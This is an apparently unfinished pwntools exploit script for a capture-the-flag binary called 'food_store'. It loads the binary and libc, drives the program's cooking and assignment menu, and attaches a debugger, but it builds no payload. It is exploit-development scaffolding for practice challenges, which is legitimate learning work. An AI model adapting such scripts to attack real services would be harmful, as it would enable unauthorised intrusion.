from pwn import *

e = ELF("./food_store")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("", )
else:
  p = process(e.path, aslr=False)

def get_assign(target):
  p.sendline("2")
  p.recvuntil("eat ")
  goal = p.recvline().strip()

  good = goal == target
  p.sendline("1" if good else "0")

  p.recvuntil("Your choice:")
  if not good:
    get_assign(target)

def cook(target):
  p.sendline("5")
  p.sendlineafter("want to cook :", target)
  p.recvuntil("Your choice:")

A = "Beef noodles"

p.sendlineafter("name:", "AAAA")
p.recvuntil("Your choice:")

cook(A)
get_assign("Beef noodles")

p.sendline("4")
p.sendlineafter("Your choice:", "1")




gdb.attach(p)

p.interactive()
